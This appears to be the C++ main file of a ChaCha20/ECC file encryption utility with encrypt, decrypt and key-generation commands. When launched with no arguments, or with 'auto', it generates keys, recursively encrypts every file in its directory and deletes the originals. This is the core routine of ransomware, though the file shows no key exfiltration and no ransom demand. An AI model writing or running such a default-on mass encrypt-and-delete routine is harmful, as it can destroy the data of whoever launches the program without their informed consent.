#include <iostream>
#include <string>
#include <filesystem>
#include <vector>
#include "file_encryptor.h"

void printUsage() {
    std::cout << "File Encryptor/Decryptor using ChaCha20 and ECC\n";
    std::cout << "Usage:\n";
    std::cout << "  file-encryptor encrypt <input_file> <output_file> [key_file]\n";
    std::cout << "  file-encryptor decrypt <input_file> <output_file> [key_file]\n";
    std::cout << "  file-encryptor generate <private_key_file> <public_key_file>\n";
    std::cout << "  file-encryptor help\n";
    std::cout << "  file-encryptor auto (or run without arguments to encrypt all files)\n";
    std::cout << "\nExamples:\n";
    std::cout << "  # Generate a key pair\n";
    std::cout << "  file-encryptor generate private.key public.key\n\n";
    std::cout << "  # Encrypt a file (generates keys if none provided)\n";
    std::cout << "  file-encryptor encrypt document.txt document.enc\n\n";
    std::cout << "  # Decrypt a file\n";
    std::cout << "  file-encryptor decrypt document.enc document_decrypted.txt\n\n";
    std::cout << "  # Encrypt using an existing public key\n";
    std::cout << "  file-encryptor encrypt document.txt document.enc public.key\n\n";
    std::cout << "  # Decrypt using a specific private key\n";
    std::cout << "  file-encryptor decrypt document.enc document_decrypted.txt private.key\n";
    std::cout << "  # Auto-encrypt all files in the directory\n";
    std::cout << "  file-encryptor auto\n";
}

// Helper function to check if a file should be skipped during auto-encryption
bool shouldSkipFile(const std::filesystem::path& path, const std::filesystem::path& exePath) {
    // Skip the executable itself
    if (path == exePath) return true;
    
    // Skip already encrypted files (with .enc extension)
    if (path.extension() == ".enc") return true;
    
    // Skip key files
    if (path.extension() == ".key") return true;
    
    return false;
}

// Function to recursively encrypt files in a directory
void encryptDirectoryRecursively(const std::string& publicKeyFile) {
    std::filesystem::path exePath = std::filesystem::canonical(std::filesystem::path(
        #ifdef _WIN32
            _pgmptr
        #else
            "/proc/self/exe"
        #endif
    ));
    
    std::filesystem::path currentDir = exePath.parent_path();
    std::vector<std::filesystem::path> filesToEncrypt;
    
    std::cout << "Scanning directory for files to encrypt: " << currentDir << std::endl;
    
    // First, scan and collect all files to encrypt
    for (const auto& entry : std::filesystem::recursive_directory_iterator(currentDir)) {
        if (entry.is_regular_file() && !shouldSkipFile(entry.path(), exePath)) {
            filesToEncrypt.push_back(entry.path());
        }
    }
    
    // Then encrypt each file
    std::cout << "Found " << filesToEncrypt.size() << " files to encrypt." << std::endl;
    for (const auto& filePath : filesToEncrypt) {
        std::string outputPath = filePath.string() + ".enc";
        std::cout << "Encrypting: " << filePath << " -> " << outputPath << std::endl;
        
        auto result = encryptFile(filePath.string(), outputPath, publicKeyFile);
        
        if (result.success) {
            std::cout << "Success: " << filePath.filename() << " - " << result.message << std::endl;
            // Delete the original file after successful encryption
            std::filesystem::remove(filePath);
        } else {
            std::cerr << "Error encrypting " << filePath.filename() << ": " << result.message << std::endl;
        }
    }
}

int main(int argc, char* argv[]) {
    // Auto mode - generate key and encrypt all files if no arguments provided
    if (argc <= 1 || (argc == 2 && std::string(argv[1]) == "auto")) {
        std::string privateKeyFile = "private.key";
        std::string publicKeyFile = "public.key";
        
        std::cout << "Running in auto encryption mode...\n";
        std::cout << "Generating encryption keys...\n";
        
        if (generateEncryptionKeys(privateKeyFile, publicKeyFile)) {
            std::cout << "Keys generated successfully:\n";
            std::cout << "  Private key: " << privateKeyFile << "\n";
            std::cout << "  Public key: " << publicKeyFile << "\n";
            
            // Now encrypt all files recursively
            encryptDirectoryRecursively(publicKeyFile);
            
            std::cout << "Auto-encryption completed.\n";
            return 0;
        } else {
            std::cerr << "Failed to generate keys. Auto-encryption aborted.\n";
            return 1;
        }
    }

    if (argc < 2 || std::string(argv[1]) == "help") {
        printUsage();
        return 0;
    }

    std::string command = argv[1];

    if (command == "generate" && argc == 4) {
        std::string privateKeyFile = argv[2];
        std::string publicKeyFile = argv[3];
        
        std::cout << "Generating key pair...\n";
        if (generateEncryptionKeys(privateKeyFile, publicKeyFile)) {
            std::cout << "Keys generated successfully:\n";
            std::cout << "  Private key: " << privateKeyFile << "\n";
            std::cout << "  Public key: " << publicKeyFile << "\n";
        } else {
            std::cerr << "Failed to generate keys.\n";
            return 1;
        }
    } else if (command == "encrypt" && (argc == 4 || argc == 5)) {
        std::string inputFile = argv[2];
        std::string outputFile = argv[3];
        std::string keyFile = (argc == 5) ? argv[4] : "";
        
        std::cout << "Encrypting file: " << inputFile << " -> " << outputFile << "\n";
        auto result = encryptFile(inputFile, outputFile, keyFile);
        
        if (result.success) {
            std::cout << "Success: " << result.message << "\n";
        } else {
            std::cerr << "Error: " << result.message << "\n";
            return 1;
        }
    } else if (command == "decrypt" && (argc == 4 || argc == 5)) {
        std::string inputFile = argv[2];
        std::string outputFile = argv[3];
        std::string keyFile = (argc == 5) ? argv[4] : "";
        
        std::cout << "Decrypting file: " << inputFile << " -> " << outputFile << "\n";
        auto result = decryptFile(inputFile, outputFile, keyFile);
        
        if (result.success) {
            std::cout << "Success: " << result.message << "\n";
        } else {
            std::cerr << "Error: " << result.message << "\n";
            return 1;
        }
    } else {
        std::cout << "Invalid command or arguments.\n";
        printUsage();
        return 1;
    }

    return 0;
}